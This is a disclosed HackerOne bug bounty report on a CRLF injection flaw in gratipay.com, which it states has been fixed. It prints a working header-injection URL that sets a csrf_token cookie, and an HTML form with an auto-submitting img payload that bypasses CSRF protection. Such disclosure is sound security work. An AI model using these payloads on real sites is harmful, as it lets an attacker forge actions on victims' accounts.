# HackerOne Report: [gratipay.com] CRLF Injection
**Report ID:** 79552
**Vulnerability Class:** Uncategorized

## Vulnerability Information & PoC
### CRLF Injection 
(Chrome, Internet Explorer)
```
http://gratipay.com/%0dSet-Cookie:csrf_token=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
```

HTTP Response:
```
Location: https://gratipay.com/\r
Set-Cookie:csrf_token=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;\r\n
```

### CSRF Protection Bypass via CRLF Injection
PoC:
```html
<form id="csrf" action="https://gratipay.com/~fickov/statement.json" method="POST"> 
<input type="hidden" name="lang" value="en" /> 
<input type="hidden" name="content" value="CSRF&#95;TEST" /> 
<input type="hidden" name="csrf&#95;token" value="xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx" /> 
<input type="submit" value="Submit request" /> 
</form> 
<img src="http://gratipay.com/%0dSet-Cookie:csrf_token=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;" onerror="csrf.submit()">
```

This vulnerability has been fixed.

## Discussion & Remediation Timeline
